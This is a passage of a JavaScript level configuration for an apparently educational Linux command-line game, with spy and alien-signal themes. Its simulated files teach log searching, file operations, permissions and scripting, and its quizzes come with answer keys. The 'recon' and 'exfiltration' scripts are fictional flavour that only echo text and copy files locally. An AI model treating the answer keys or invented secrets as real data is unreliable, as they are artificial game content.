        },

        // ──────────────────────────────────────────────────────────
        // CLH-005: Log Analysis
        // Theme: Deep space SETI monitoring, alien signal detection
        // ──────────────────────────────────────────────────────────
        'CLH-005': {
            title: 'Log Analysis',
            description: 'Read the system logs. Every action leaves a trace.',
            prerequisites: ['CLH-004'],
            tier: 'CLI Analyst',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['logs', 'reports', '.bash_history', '.classified_memo', '.log_cheatsheet']
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['system.log', 'auth.log', 'README.txt']
                },
                '/home/operator/logs/system.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 1842,
                    content: `Jan 15 02:13:11 shadow signal_proc: [INIT] Deep Space Monitoring Array online
Jan 15 02:13:11 shadow signal_proc: [INFO] Dish alignment: Cygnus X-1 quadrant
Jan 15 02:13:12 shadow signal_proc: [INFO] Frequency scan: 1420.405 MHz (hydrogen line)
Jan 15 02:13:14 shadow anomaly_det: [INFO] Background noise baseline established
Jan 15 02:13:15 shadow crypto_mod: [INFO] Decryption module standing by
Jan 15 02:47:33 shadow signal_proc: [ALERT] Signal strength spike detected
Jan 15 02:47:34 shadow anomaly_det: [WARN] Non-random pattern identified in carrier wave
Jan 15 02:47:35 shadow signal_proc: [INFO] Locking dish position for sustained capture
Jan 15 02:47:36 shadow anomaly_det: *ERROR* Pattern matches no known terrestrial source
Jan 15 02:47:37 shadow crypto_mod: [INFO] Attempting frequency decomposition
Jan 15 02:47:38 shadow signal_proc: [INFO] Signal duration: 72 seconds continuous
Jan 15 02:47:39 shadow anomaly_det: [WARN] Mathematical structure detected in signal
Jan 15 02:47:40 shadow crypto_mod: [INFO] Prime number sequence identified in header
Jan 15 02:47:41 shadow anomaly_det: *ERROR* Signal origin: extrasolar - no satellite match
Jan 15 02:47:42 shadow signal_proc: [ALERT] Recording to classified buffer
Jan 15 02:47:43 shadow crypto_mod: [INFO] Partial decode: binary image data detected
Jan 15 02:47:44 shadow systemd[1]: Starting Emergency Protocol Service...
Jan 15 02:47:45 shadow notify: [CRIT] Automatic alert sent to FACILITY DIRECTOR
Jan 15 02:47:46 shadow signal_proc: [INFO] Signal terminated - source moved out of range
Jan 15 02:47:47 shadow anomaly_det: [INFO] Event logged as CONTACT-2847`
                },
                '/home/operator/logs/auth.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `Jan 15 02:12:26 shadow sshd[512]: Server listening on 0.0.0.0 port 22
Jan 15 02:12:45 shadow sshd[623]: Accepted publickey for operator from 10.0.0.1
Jan 15 02:12:45 shadow sshd[623]: pam_unix(sshd:session): session opened for user operator
Jan 15 02:48:01 shadow sudo: operator : TTY=pts/0 ; PWD=/home/operator ; COMMAND=/bin/cat /var/classified/signal_buffer.raw
Jan 15 02:48:01 shadow sudo: pam_unix(sudo:session): session opened for user root
`
                },
                '/home/operator/logs/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `SIGNAL MONITORING STATION - LOG ANALYSIS REQUIRED
==================================================
Facility: Listening Post ECHO-7
Date: January 15, 2024
Classification: TOP SECRET//MAJIC

OBJECTIVE: Identify ERROR entries in system.log
These errors triggered automatic protocol escalation.

BACKGROUND: At 0247 hours, the deep space monitoring
array detected an anomalous signal. Your task is to
document the error entries that flagged this event.

NOTE: This facility does not officially exist.
`
                },
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['TEMPLATE.txt', 'previous_incidents.log', '.analyst_notes']
                },
                '/home/operator/reports/TEMPLATE.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 412,
                    content: `INCIDENT REPORT TEMPLATE
========================
Classification: [SECRET/TOP SECRET/MAJIC]
Date: [YYYY-MM-DD]
Analyst: [NAME]
Event ID: [CONTACT-XXXX]

SUMMARY:
[Brief description of the incident]

ERROR LOG ANALYSIS:
- Total ERROR entries found: [X]
- First occurrence: [timestamp]
- Last occurrence: [timestamp]

FINDINGS:
[Detailed analysis]

RECOMMENDATION:
[Suggested action]

SIGNATURES:
Analyst: _________________
Supervisor: _________________
`
                },
                '/home/operator/reports/previous_incidents.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `CONTACT-2841 | 2024-01-03 | FALSE POSITIVE | Satellite interference
CONTACT-2842 | 2024-01-05 | FALSE POSITIVE | Solar flare noise
CONTACT-2843 | 2024-01-08 | UNRESOLVED | Pattern detected, lost signal
CONTACT-2844 | 2024-01-10 | FALSE POSITIVE | Military satellite
CONTACT-2845 | 2024-01-12 | FALSE POSITIVE | Amateur radio bounce
CONTACT-2846 | 2024-01-14 | UNRESOLVED | Mathematical structure, 12sec
CONTACT-2847 | 2024-01-15 | PENDING | **YOU ARE HERE** - 72sec signal
`
                },
                '/home/operator/reports/.analyst_notes': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `Personal notes - DO NOT INCLUDE IN OFFICIAL REPORT

The 2847 signal is different. The others were noise or
satellites, but this one... the math doesn't lie.

Prime number headers. Binary image encoding. 72 seconds
of structured data from OUTSIDE the solar system.

If this is real, everything changes.

- J.
`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 42,
                    content: `ls
cd logs
head system.log
tail system.log
grep ERROR system.log
grep -c ERROR system.log
grep -i warn system.log
`
                },
                '/home/operator/.log_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 768,
                    content: `LOG ANALYSIS - OPERATOR CHEATSHEET
====================================

READING LOGS
  cat file.log       Display entire log
  head file.log      Show first 10 lines
  head -n 20 file    Show first 20 lines
  tail file.log      Show last 10 lines
  tail -n 50 file    Show last 50 lines
  tail -f file.log   Follow log in real-time

SEARCHING LOGS
  grep "pattern" file.log          Find matching lines
  grep -i "pattern" file.log       Case insensitive
  grep -c "pattern" file.log       Count matches
  grep -n "pattern" file.log       Show line numbers

LOG SEVERITY LEVELS
  [INFO]  - Informational message
  [WARN]  - Warning, potential issue
  *ERROR* - Error condition
  [CRIT]  - Critical, immediate attention
  [ALERT] - Alert condition

COMMON PATTERNS
  grep ERROR system.log           Find all errors
  grep -c ERROR system.log        Count errors
  grep "Jan 15 02:47" system.log  Filter by timestamp

LOG ANALYSIS WORKFLOW
  1. Survey the log with head/tail
  2. Search for ERROR and WARN entries
  3. Count occurrences with grep -c
  4. Document findings with line numbers

"Every action leaves a trace. Find it."
`
                },
                '/home/operator/.classified_memo': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `EYES ONLY - DIRECTOR'S MEMO
============================
If you are reading this, CONTACT-2847 is real.

The signal contained what appears to be a binary
encoded image. Preliminary analysis suggests it
depicts a star map with our solar system marked.

Do NOT discuss this with anyone outside the program.
The official cover story is "equipment malfunction."

- Director [REDACTED]
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Locate Log Files',
                    hint: 'Survey your environment: ls',
                    check: (cmd, state, output) => (cmd.trim() === 'ls' || cmd.startsWith('ls ')) &&
                        output && (output.includes('logs') || output.includes('reports'))
                },
                {
                    id: 2,
                    task: 'INFILTRATE: Enter Logs Directory',
                    hint: 'Navigate to logs: cd logs',
                    check: (cmd, state) => state.currentDir.includes('/logs')
                },
                {
                    id: 3,
                    task: 'SURVEY: Preview System Log',
                    hint: 'Preview with head: head system.log',
                    check: (cmd, state, output) => cmd.includes('head') && cmd.includes('system') &&
                        output && output.includes('signal_proc')
                },
                {
                    id: 4,
                    task: 'HUNT: Find All ERROR Entries',
                    hint: 'Search for errors: grep "ERROR" system.log',
                    check: (cmd, state, output) => cmd.includes('grep') &&
                        (cmd.toLowerCase().includes('error') || cmd.includes('ERROR')) &&
                        output && output.includes('ERROR')
                },
                {
                    id: 5,
                    task: 'ANALYZE: Count Error Entries',
                    hint: 'Count errors: grep -c "ERROR" system.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-c') &&
                        output && /^\d+$/.test(output.trim())
                },
            ],

            // Insight Phase - analysis question after objectives complete
            insightPhase: {
                enabled: true,
                question: "According to the anomaly detector, where did the signal originate?",
                acceptedAnswers: [
                    "extrasolar",
                    "extra-solar",
                    "extra solar",
                    "outside the solar system",
                    "outside solar system",
                    "not terrestrial",
                    "non-terrestrial",
                    "beyond the solar system"
                ],
                hint: "Look at the ERROR entries in system.log - what location is mentioned?",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Intelligence not confirmed. Review the ERROR entries in system.log.",
                correctAnswerMessage: "Signal origin confirmed: EXTRASOLAR. Excellent analysis, Operator."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-006: File Operations
        // Theme: Spy operations, dead drops, encrypted channels
        // ──────────────────────────────────────────────────────────
        'CLH-006': {
            title: 'File Operations',
            description: 'Create, copy, move, and manipulate. Control the filesystem.',
            prerequisites: ['CLH-005'],
            tier: 'CLI Analyst',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['intel', 'temp', 'backup', '.bash_history', '.dead_drop', '.fileops_cheatsheet']
                },
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['briefing.txt', 'contacts.txt']
                },
                '/home/operator/intel/briefing.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 142,
                    content: `OPERATION SHADOWSTRIKE
=====================
Objective: Establish secure dead drop system
Target: Enemy communications network
Status: Active
Classification: TOP SECRET//NOFORN

Handler codename: RAVEN
Next contact window: 0300 hours
`
                },
                '/home/operator/intel/contacts.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 98,
                    content: `FIELD ASSETS - ENCRYPTED CHANNELS
==================================
Alpha Team (Berlin): 192.168.1.10
Bravo Team (Moscow): 192.168.1.20
Charlie Team (Tehran): 192.168.1.30
`
                },
                '/home/operator/temp': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['data.txt', 'cache.tmp']
                },
                '/home/operator/temp/data.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 186,
                    content: `INTERCEPTED TRANSMISSION
========================
Timestamp: 2024-01-15 14:32:07 UTC
Source: Unidentified numbers station
Frequency: 4625 kHz (UVB-76 adjacent)
Content: Possible one-time pad cipher
Status: Awaiting cryptanalysis
`
                },
                '/home/operator/temp/cache.tmp': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 64,
                    content: 'DECRYPT_KEY=0x7F3A9B2C\nSESSION_ID=SHADOWSTRIKE-447\n'
                },
                '/home/operator/backup': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/backup/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: 'BACKUP DIRECTORY\n================\nStore backup copies here using: cp file backup/\nRemember: Two copies is one, one copy is none.\n'
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 12,
                    content: `mkdir operations
touch operations/mission.log
cp intel/briefing.txt operations/
mv temp/data.txt operations/classified.txt
rm -r temp
ls -la
`
                },
                '/home/operator/.fileops_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 768,
                    content: `FILE OPERATIONS - OPERATOR CHEATSHEET
=======================================

CREATING
  mkdir dir           Create directory
  mkdir -p a/b/c      Create nested directories
  touch file          Create empty file (or update timestamp)

COPYING
  cp source dest      Copy file
  cp -r dir dest      Copy directory recursively
  cp file1 file2 dir/ Copy multiple files to directory

MOVING / RENAMING
  mv source dest      Move or rename file
  mv file dir/        Move file into directory
  mv old.txt new.txt  Rename file

REMOVING
  rm file             Remove file
  rm -r dir           Remove directory recursively
  rm -f file          Force remove (no prompt)
  rm -rf dir          Force remove directory

BEST PRACTICES
  1. Always backup before deleting
  2. Use -i flag for interactive confirmation
  3. Double-check rm commands before executing
  4. Test with ls first to verify paths

OPERATOR TIP:
  Copy sensitive files before moving:
  cp file backup/ && mv file classified/

"Control the filesystem. Control the operation."
`
                },
                '/home/operator/.dead_drop': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 178,
                    content: `DEAD DROP PROTOCOL
==================
Location: /operations/classified/
Passphrase: "The owl flies at midnight"
Fallback: Brush pass at coordinates 52.5200N 13.4050E

BURN AFTER READING
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'Create operations directory',
                    hint: 'Try: mkdir operations',
                    check: (cmd, state, output, terminal) => {
                        if (cmd.includes('mkdir') && cmd.includes('operations')) {
                            // Check if directory now exists in terminal fs
                            return true;  // We rely on the command being run
                        }
                        return false;
                    }
                },
                {
                    id: 2,
                    task: 'Create mission.log file',
                    hint: 'Try: touch operations/mission.log',
                    check: (cmd, state) => cmd.includes('touch') && cmd.includes('mission.log')
                },
                {
                    id: 3,
                    task: 'Copy briefing.txt to operations',
                    hint: 'Try: cp intel/briefing.txt operations/',
                    check: (cmd, state) => cmd.includes('cp') && cmd.includes('briefing')
                },
                {
                    id: 4,
                    task: 'Move data.txt to operations as classified.txt',
                    hint: 'Try: mv temp/data.txt operations/classified.txt',
                    check: (cmd, state) => cmd.includes('mv') && (cmd.includes('classified') || cmd.includes('operations'))
                },
                {
                    id: 5,
                    task: 'Remove the temp directory',
                    hint: 'Try: rm -r temp',
                    check: (cmd, state) => cmd.includes('rm') && cmd.includes('temp')
                },
            ],

            // Insight Phase - analysis question after objectives complete
            insightPhase: {
                enabled: true,
                question: "Before you leave, what is the dead drop passphrase?",
                acceptedAnswers: [
                    "the owl flies at midnight",
                    "owl flies at midnight",
                    "the owl flies at midnight.",
                    "\"the owl flies at midnight\""
                ],
                hint: "Check for hidden files in your home directory using ls -la",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Passphrase not recognized. Did you check all files, including hidden ones?",
                correctAnswerMessage: "Passphrase confirmed. Dead drop protocol acknowledged."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-007: Permissions & Access Control
        // Theme: Black site security, access control, lockdown
        // ──────────────────────────────────────────────────────────
        'CLH-007': {
            title: 'Permissions & Access Control',
            description: 'Understand who can do what. Permissions are the first line of defense.',
            prerequisites: ['CLH-006'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['secure', 'public', '.bash_history', '.shadow_network', '.permissions_cheatsheet']
                },
                '/home/operator/secure': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['secret.txt', 'deploy.sh', 'audit.log', 'config.ini']
                },
                '/home/operator/secure/secret.txt': {
                    type: 'file',
                    perms: '-rw-rw-r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `PROJECT LOOKING GLASS - ENCRYPTION KEYS
========================================
Classification: TOP SECRET//SCI//NOFORN

Temporal Comm Array Key: 0xA7F3B2C9D1E8F456
Dimensional Beacon Key:  0x8B2E4F6A1C3D5789
Emergency Shutdown Auth: 0xDEAD0000BEEF1234

WARNING: Unauthorized access is a federal crime
punishable under 18 U.S.C. 1030
`
                },
                '/home/operator/secure/deploy.sh': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 186,
                    content: `#!/bin/bash
# BLACKSITE FIRMWARE DEPLOYMENT
# Target: Sublevel 7 monitoring array

echo "Authenticating with DARPA uplink..."
rsync -avz --encrypt ./firmware/ blacksite:/sys/array/
echo "Deployment complete. Wipe local cache."
rm -rf /tmp/firmware_*
`
                },
                '/home/operator/secure/audit.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `2024-01-15 03:00:00 - ARRAY ONLINE - Sublevel 7
2024-01-15 03:01:23 - Biometric auth: OPERATOR-7
2024-01-15 03:05:45 - WARNING: Unauthorized file access attempt
2024-01-15 03:05:46 - Intruder countermeasures ARMED
2024-01-15 03:12:00 - Anomaly detected in sector 4
2024-01-15 03:12:01 - Lockdown protocol STANDBY
`
                },
                '/home/operator/secure/config.ini': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 142,
                    content: `[monitoring_array]
host=blacksite.darpa.mil
port=7777
auth=biometric+keycard

[failsafe]
self_destruct_code=ECHO-SEVEN-NINER
countdown_seconds=300
`
                },
                '/home/operator/public': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['readme.txt']
                },
                '/home/operator/public/readme.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 98,
                    content: `FACILITY NOTICE
===============
This terminal is for authorized personnel only.
All activity is monitored and logged.
`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `ls -la secure/
chmod 600 secure/secret.txt
chmod 755 secure/deploy.sh
stat secure/secret.txt
ls -la
`
                },
                '/home/operator/.shadow_network': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 186,
                    content: `SHADOW NETWORK ACCESS POINTS
============================
Node Alpha: 10.13.37.1 (active)
Node Beta:  10.13.37.2 (standby)
Node Gamma: 10.13.37.3 (COMPROMISED - DO NOT USE)

Mesh key rotation: Every 6 hours
Next rotation: 0600 UTC
`
                },
                '/home/operator/.permissions_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 768,
                    content: `PERMISSIONS - OPERATOR CHEATSHEET
===================================

READING PERMISSIONS (ls -l output)
  drwxr-xr-x  = directory, owner rwx, group rx, other rx
  -rw-r--r--  = file, owner rw, group r, other r

  Position: [type][owner][group][other]
  r = read (4), w = write (2), x = execute (1)

NUMERIC NOTATION
  0 = ---    4 = r--
  1 = --x    5 = r-x
  2 = -w-    6 = rw-
  3 = -wx    7 = rwx

COMMON PERMISSIONS
  644 = -rw-r--r--  Standard file
  755 = -rwxr-xr-x  Executable script
  600 = -rw-------  Private file (secrets)
  700 = -rwx------  Private executable

CHANGING PERMISSIONS
  chmod 600 file       Numeric mode
  chmod u+x file       Add execute for user
  chmod go-rwx file    Remove all for group/other
  chmod +x script.sh   Make executable

SPECIAL DIRECTORIES
  700 = drwx------   Private directory
  755 = drwxr-xr-x   Shared directory

SECURITY TIP:
  Secrets should always be 600 or 700
  Never leave sensitive files world-readable

"Control access. Protect the mission."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Analyze Current Permissions',
                    hint: 'List permissions: ls -la secure/',
                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('-l') &&
                        cmd.includes('secure') && output && output.includes('rw')
                },
                {
                    id: 2,
                    task: 'LOCKDOWN: Restrict Secret File',
                    hint: 'Owner-only access: chmod 600 secure/secret.txt',
                    check: (cmd, state) => cmd.includes('chmod') && cmd.includes('600') && cmd.includes('secret')
                },
                {
                    id: 3,
                    task: 'ENABLE: Make Script Executable',
                    hint: 'Full permissions: chmod 755 secure/deploy.sh',
                    check: (cmd, state) => cmd.includes('chmod') && cmd.includes('755') && cmd.includes('deploy')
                },
                {
                    id: 4,
                    task: 'VERIFY: Check Secret File Permissions',
                    hint: 'Use stat to inspect: stat secure/secret.txt',
                    check: (cmd, state, output) => cmd.includes('stat') && cmd.includes('secret') &&
                        output && output.includes('Access')
                },
                {
                    id: 5,
                    task: 'AUDIT: Review Audit Log Details',
                    hint: 'Inspect log file: stat secure/audit.log',
                    check: (cmd, state, output) => cmd.includes('stat') && cmd.includes('audit') &&
                        output && output.includes('Access')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "Before leaving the facility, which Shadow Network node is compromised?",
                acceptedAnswers: [
                    "gamma",
                    "node gamma",
                    "gamma node",
                    "10.13.37.3"
                ],
                hint: "Check for hidden files in your home directory - network intel may be stored there.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Node not recognized. Review the shadow network access points.",
                correctAnswerMessage: "Confirmed. Node Gamma flagged as compromised - avoid at all costs."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-008: Shell Scripting
        // Theme: Field operations, dead drops, asset management
        // ──────────────────────────────────────────────────────────
        'CLH-008': {
            title: 'Shell Scripting',
            description: 'Automate your operations. Write scripts that work while you sleep.',
            prerequisites: ['CLH-007'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['scripts', 'data', '.bash_history', '.exfil_protocol', '.scripting_cheatsheet']
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['recon.sh', 'backup.sh', 'alert.sh']
                },
                '/home/operator/scripts/recon.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `#!/bin/bash
# INFILTRATION RECON SCRIPT
# Codename: SILENT WITNESS
# Deploy on target to gather intel

echo "=== TARGET SYSTEM RECON ==="
echo "Operative: $(whoami)"
echo "Target ID: $(hostname)"
echo "Position: $(pwd)"
echo "Timestamp: $(date +%Y%m%d-%H%M%S)"
echo ""
echo "Network interfaces:"
ip addr 2>/dev/null || ifconfig
echo "==========================="
echo "Exfiltrating to command..."
`
                },
                '/home/operator/scripts/backup.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 412,
                    content: `#!/bin/bash
# DEAD DROP BACKUP PROTOCOL
# Creates encrypted backup for handler pickup

DROPSITE="dead_drop_$(date +%Y%m%d_%H%M)"

echo "[*] Initiating dead drop protocol..."
mkdir -p "$DROPSITE"

echo "[*] Packaging intel for exfiltration..."
cp -r data/ "$DROPSITE/" 2>/dev/null

echo "[*] Encrypting package..."
# tar czf - "$DROPSITE" | openssl enc -aes-256-cbc

echo "[+] Dead drop ready at: $DROPSITE"
echo "[!] BURN NOTICE: Delete after handler confirms receipt"
`
                },
                '/home/operator/scripts/alert.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 298,
                    content: `#!/bin/bash
# EMERGENCY BROADCAST SYSTEM
# Triggers network-wide alert to all assets

THREAT_LEVEL="$1"
INTEL="$2"

echo "================================"
echo "[FLASH] PRIORITY ALERT"
echo "[FLASH] Threat Level: $THREAT_LEVEL"
echo "[FLASH] $INTEL"
echo "[FLASH] Timestamp: $(date)"
echo "[FLASH] All assets go to ground"
echo "================================"
`
                },
                '/home/operator/data': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['config.txt', 'notes.txt', 'asset_list.txt']
                },
                '/home/operator/data/config.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 142,
                    content: `[command_control]
primary_server=10.0.0.1
backup_server=10.0.0.2
port=4443
protocol=encrypted_mesh

[dead_drop]
rotation_hours=12
max_size_mb=50
`
                },
                '/home/operator/data/notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 186,
                    content: `HANDLER NOTES - EYES ONLY
=========================
Asset MOCKINGBIRD compromised - cut contact
Asset BLUEJAY relocated to safehouse DELTA
Asset RAVEN status: ACTIVE - high value intel incoming

Next check-in window: 0300 UTC
`
                },
                '/home/operator/data/asset_list.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `FIELD ASSETS - CURRENT STATUS
==============================
MOCKINGBIRD - BURNED
BLUEJAY     - RELOCATED
RAVEN       - ACTIVE
SPARROW     - DEEP COVER
PHOENIX     - EXTRACTED
`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `ls scripts/
cat scripts/recon.sh
bash scripts/recon.sh
bash scripts/backup.sh
ls -la
chmod +x scripts/*.sh
`
                },
                '/home/operator/.exfil_protocol': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 198,
                    content: `EMERGENCY EXFILTRATION PROTOCOL
================================
1. Run: ./scripts/backup.sh
2. Signal handler via chalk mark at Site C
3. Leave package at dead drop coordinates:
   40.7484° N, 73.9857° W (under bench)
4. BURN ALL LOCAL COPIES
5. Go dark for 72 hours
`
                },
                '/home/operator/.scripting_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 768,
                    content: `SHELL SCRIPTING - OPERATOR CHEATSHEET
=======================================

SCRIPT BASICS
  #!/bin/bash          Shebang - tells system to use bash
  chmod +x script.sh   Make script executable
  ./script.sh          Run script directly
  bash script.sh       Run with bash explicitly

VARIABLES
  VAR="value"          Set variable (no spaces!)
  echo "$VAR"          Print variable
  $(command)           Command substitution
  $1, $2, ...          Script arguments

COMMON COMMANDS IN SCRIPTS
  echo "text"          Print output
  read VAR             Read user input
  date +%Y%m%d         Formatted date
  whoami               Current user
  hostname             Current host
  pwd                  Current directory

OPERATORS
  command1 && command2   Run 2 if 1 succeeds
  command1 || command2   Run 2 if 1 fails
  command1 ; command2    Run both regardless
  command > file         Redirect output to file
  command >> file        Append output to file

BEST PRACTICES
  1. Always start with #!/bin/bash
  2. Use meaningful variable names
  3. Add comments for complex logic
  4. Test scripts on non-critical data first

"Automate once, execute many."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Survey Available Scripts',
                    hint: 'List scripts: ls scripts/',
                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('scripts') &&
                        output && (output.includes('recon') || output.includes('.sh'))
                },
                {
                    id: 2,
                    task: 'INTEL: Examine Recon Script',
                    hint: 'Read the script: cat scripts/recon.sh',
                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('recon') &&
                        output && output.includes('#!/bin/bash')
                },
                {
                    id: 3,
                    task: 'EXECUTE: Run Recon Script',
                    hint: 'Execute: bash scripts/recon.sh',
                    check: (cmd, state, output) => (cmd.includes('bash') || cmd.includes('./')) &&
                        cmd.includes('recon') && output && output.includes('RECON')
                },
                {
                    id: 4,
                    task: 'DEPLOY: Run Backup Protocol',
                    hint: 'Execute: bash scripts/backup.sh',
                    check: (cmd, state, output) => (cmd.includes('bash') || cmd.includes('./')) &&
                        cmd.includes('backup') && output && output.includes('dead drop')
                },
                {
                    id: 5,
                    task: 'VERIFY: Confirm Backup Created',
                    hint: 'Check results: ls -la',
                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('-l') &&
                        output && output.includes('scripts')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "If extraction is required, what are the dead drop coordinates?",
                acceptedAnswers: [
                    "40.7484",
                    "73.9857",
                    "40.7484° n, 73.9857° w",
                    "40.7484 n 73.9857 w",
                    "under bench"
                ],
                hint: "Check for hidden protocol files that detail emergency procedures.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Coordinates not recognized. Review the exfiltration protocol.",
                correctAnswerMessage: "Dead drop coordinates confirmed. Package under bench - handler notified."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-009: Text Processing
        // Theme: Log analysis and data extraction
        // ──────────────────────────────────────────────────────────
        'CLH-009': {
            title: 'Text Processing',
            description: 'Master cut, sort, uniq, awk, and sed. Transform and analyze data streams.',
            prerequisites: ['CLH-008'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['intel', 'reports', 'logs', 'data', 'scripts', '.bash_history', '.config', '.notes', '.text_processing_cheatsheet']
                },
                // === INTEL DIRECTORY ===
                '/home/operator/intel': {
                    type: 'dir',
